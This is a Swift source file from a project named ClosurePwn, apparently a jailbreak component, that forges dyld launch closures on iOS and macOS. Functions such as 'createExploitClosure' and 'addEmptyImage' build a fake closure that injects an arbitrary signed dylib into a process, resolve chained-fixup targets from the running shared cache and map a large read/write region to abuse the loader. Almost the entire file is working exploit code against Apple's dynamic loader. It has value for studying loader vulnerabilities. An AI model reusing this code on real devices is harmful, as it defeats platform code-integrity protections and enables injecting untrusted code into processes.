//
//  ClosureBuilder.swift
//  ClosurePwn
//
//  Created by Linus Henze.
//  Copyright © 2021 Linus Henze. All rights reserved.
//

import Foundation
import MachO
import JailbreakUtils

enum ClosureBuildError: Error {
    case symbolNotFound(symbol: String)
    case noCodeSignatureFound
    case dyldEntryVectorNotFound
}

public func createChainedFixups(for machO: MachO) throws -> (ChainedFixupsStart, ChainedFixupsEntry) {
    let chain = try machO.getChainedFixups()
    
    guard chain.highestOrdinal != nil else {
        throw MachOError.BadFormat
    }
    
    let fixupEntry = ChainedFixupsEntry()
    for _ in 0...chain.highestOrdinal! {
        fixupEntry.targets.append(.absolute(address: 0))
    }
    
    try chain.forEachFixup { (loc, vAddr, fixup) in
        var ordinal: UInt16? = nil
        if case .authBind(ordinal: let o, diversity: _, addrDiv: _, key: _, next: _) = fixup {
            ordinal = o
        } else if case .bind(ordinal: let o, addend: _, next: _) = fixup {
            ordinal = o
        }
        
        if ordinal != nil {
            let name = String(chain.symbol(forFixup: fixup)!.dropFirst())
            let addr = dlsym(dlopen(nil, 0), name)
            
            // XXX: addr might sometimes be nil on macOS...
            if addr == nil {
                fixupEntry.targets[Int(ordinal!)] = .absolute(address: 0)
            } else {
                fixupEntry.targets[Int(ordinal!)] = try SharedCache.running.offsetOfPointer(OpaquePointer(addr!))
            }
        }
    }
    
    let fixupStart = ChainedFixupsStart()
    fixupStart.start = chain.startForClosure
    
    return (fixupStart, fixupEntry)
}

public func createExploitClosure(injectedImage: String, dependencies: [String], name: String = "Something") throws -> LaunchClosure {
    let pwnMachO = try MachO(fromFile: injectedImage)
    let shCache = try SharedCache()
    let closure = LaunchClosure()
    
    let imageArray = ImageArray()
    imageArray.firstImageNumber = 0x2000
    imageArray.hasRoots = false
    closure.children.append(imageArray)
    
    // First build main image
    let mainImage = Image()
    imageArray.images.append(mainImage)
    
    // Main image flags
    let mainImageFlags = ImageFlags()
    mainImageFlags.imageNum = 0x2000
    mainImageFlags.is64 = true
    mainImageFlags.neverUnload = true
    mainImageFlags.isExecutable = true
    mainImageFlags.hasReadOnlyData = true
    mainImage.children.append(mainImageFlags)
    
    // Must be present, content ignored
    let pathHash = PathAndHash()
    pathHash.path = name // Whatever you want
    mainImage.children.append(pathHash)
    
    // Must be present, content ignored
    let mpInfo = MappingInfo()
    mpInfo.sliceOffsetIn4K = 0
    mpInfo.totalVMPages = 0
    mainImage.children.append(mpInfo)
    
    // Dyld only checks that the first segment is executable
    // and has at least the size of one page
    // Everything else is ignored
    let diskSegs = DiskSegments()
    let firstSeg = DiskSegments.DiskSegment()
    firstSeg.permissions = 5
    firstSeg.filePageCount = 1
    firstSeg.vmPageCount = 1
    diskSegs.segments.append(firstSeg)
    mainImage.children.append(diskSegs)
    
    // Dependencies
    let deps = Dependents()
    for d in dependencies {
        deps.images.append(.init(withImageNumber: try shCache.imageNumber(for: d), andLinkKind: .regular))
    }
    deps.images.append(.init(withImageNumber: 0x2002, andLinkKind: .regular))
    deps.images.append(.init(withImageNumber: 0x2001, andLinkKind: .regular))
    mainImage.children.append(deps)
    
    // Stuff to init before
    // Just copy from Foundation
#if os(iOS)
    let foundationPath = "/System/Library/Frameworks/Foundation.framework/Foundation"
#elseif os(macOS)
    let foundationPath = "/System/Library/Frameworks/Foundation.framework/Versions/C/Foundation"
#else
    #error("Unknown OS!")
#endif
    
    let initBefores = InitBefores()
    initBefores.images = try shCache.initBefores(ofImage: foundationPath).images
    mainImage.children.append(initBefores)
    
    // Now create pwn image
    let pwnImage = Image()
    imageArray.images.append(pwnImage)
    
    // Pwn image flags
    let pwnImageFlags = ImageFlags()
    pwnImageFlags.imageNum = 0x2002
    pwnImageFlags.is64 = true
    pwnImageFlags.isDylib = true
    pwnImageFlags.neverUnload = true
    pwnImageFlags.hasChainedFixups = true
    pwnImageFlags.hasReadOnlyData = true
    pwnImage.children.append(pwnImageFlags)
    
    // Path with hash
    let pwnPathWithHash = PathAndHash()
    pwnPathWithHash.path = injectedImage
    pwnImage.children.append(pwnPathWithHash)
    
    // Code signature
    guard let csLc: CSLoadCommand = pwnMachO.findLoadCommand(ofType: .CodeSignature) else {
        throw ClosureBuildError.noCodeSignatureFound
    }
    
    let pwnCs = CodeSignatureLocation()
    pwnCs.fileOffset = csLc.csOffset
    pwnCs.fileSize = csLc.csSize
    pwnImage.children.append(pwnCs)
    
    // Calculate needed size
    var pageCount: UInt32 = 0
    for lc in pwnMachO.cmds {
        if let slc = lc as? Segment64LoadCommand {
            pageCount += UInt32(slc.vmSize / 0x1000)
        }
    }
    
    // Mapping info
    let pwnMappingInfo = MappingInfo()
    pwnMappingInfo.totalVMPages = pageCount
    
    do {
        let fat = try FAT(fromData: Data(contentsOf: URL(fileURLWithPath: injectedImage)))
        pwnMappingInfo.sliceOffsetIn4K = try fat.bestArch().offset / 0x1000
    } catch {
        pwnMappingInfo.sliceOffsetIn4K = 0
    }
    
    pwnImage.children.append(pwnMappingInfo)
    
    // Disk segments
    let pwnDiskSegments = DiskSegments()
    for lc in pwnMachO.cmds {
        if let slc = lc as? Segment64LoadCommand {
            let seg = DiskSegments.DiskSegment()
            seg.filePageCount = UInt32(slc.fileSize / 0x1000)
            seg.vmPageCount = UInt32(slc.vmSize / 0x1000)
            seg.permissions = UInt8(slc.protection.rawValue & 0xFF)
            pwnDiskSegments.segments.append(seg)
        }
    }
    pwnImage.children.append(pwnDiskSegments)
    
    // Init befores
    pwnImage.children.append(initBefores)
    
    // Dependents
    let pwnDeps = Dependents()
    for d in dependencies {
        pwnDeps.images.append(.init(withImageNumber: try shCache.imageNumber(for: d), andLinkKind: .regular))
    }
    pwnDeps.images.append(.init(withImageNumber: 0x2001, andLinkKind: .regular))
    pwnImage.children.append(pwnDeps)
    
    // Chained fixups
    let chainedFixupData = try createChainedFixups(for: pwnMachO)
    pwnImage.children.append(chainedFixupData.0)
    pwnImage.children.append(chainedFixupData.1)
    
    // Ensure BindFixups exist
    _ = pwnImage.getOrCreateChild(type: 21) as BindFixups
    
    // Now the closure itself
    // Dyld UUID
    let dyldUUID = DyldUUID()
    dyldUUID.uuid = shCache.uuid
    closure.children.append(dyldUUID)
    
    // Closure Flags
    closure.flags = ClosureFlags()
    closure.flags!.initImageCount = 500
    
    // LibSystem number
    let libSysNum = LibSystemNumber()
    libSysNum.imageNumber = try shCache.imageNumber(for: "/usr/lib/libSystem.B.dylib")
    closure.children.append(libSysNum)
    
    // LibDyld entry
    guard let libDyldVector = dlsym(dlopen(nil, 0), "_ZN5dyld318entryVectorForDyldE") else {
        throw ClosureBuildError.dyldEntryVectorNotFound
    }
    
    let libDyld = LibDyldEntry()
    libDyld.target = try SharedCache.running.offsetOfPointer(OpaquePointer(libDyldVector))
    closure.children.append(libDyld)
    
    // TopImage
    closure.topImageNumber = 0x2000
    
    // MainEntry
    let mainEntry = MainEntry()
    closure.children.append(mainEntry)
    
    // Missing Files
    let missingFiles = MissingFiles()
    closure.children.append(missingFiles)
    
    // Done
    return closure
}

@discardableResult
public func addEmptyImage(toClosure: LaunchClosure, imagePath: String, pageCount: UInt32) -> UInt32 {
    // Construct new image
    let image = Image()
    toClosure.imageArray!.images.append(image)
    
    // Image flags must come first
    let mainImageFlags = ImageFlags()
    mainImageFlags.imageNum = 0x2001
    mainImageFlags.is64 = true
    mainImageFlags.isDylib = true
    mainImageFlags.neverUnload = true
    image.children.append(mainImageFlags)
    
    // Now path with hash
    let pathWithHash = PathAndHash()
    pathWithHash.path = imagePath
    image.children.append(pathWithHash)
    
    // Also need mapping info
    let mappingInfo = MappingInfo()
    mappingInfo.totalVMPages = pageCount + 3
    
    do {
        let fat = try FAT(fromData: Data(contentsOf: URL(fileURLWithPath: imagePath)))
        mappingInfo.sliceOffsetIn4K = try fat.bestArch().offset / 0x1000
    } catch {
        mappingInfo.sliceOffsetIn4K = 0
    }
    
    image.children.append(mappingInfo)
    
    // And disk segments of course
    let diskSegments = DiskSegments()
    image.children.append(diskSegments)
    
    // This is a pwn image -> skip some stuff
    let firstSegment = DiskSegments.DiskSegment()
    firstSegment.filePageCount = 183 // Map first page
    firstSegment.vmPageCount = 183
    firstSegment.permissions = 3 // R/W
    diskSegments.segments.append(firstSegment)
    
    // As well as init befores
    let initBefores = InitBefores()
    image.children.append(initBefores)
    
    // Add main image as our dependency
    let deps = Dependents()
    deps.images.append(.init(withImageNumber: 0x2000, andLinkKind: .regular))
    image.children.append(deps)
    
    // And make sure the main image has us as dependency
    (toClosure.imageArray!.images[0].children.filter { (i) -> Bool in
        i.type == 15
    }[0] as! Dependents).images.append(.init(withImageNumber: 0x2001, andLinkKind: .regular))
    
    toClosure.flags!.initImageCount += 1
    
    return 0x2001
}
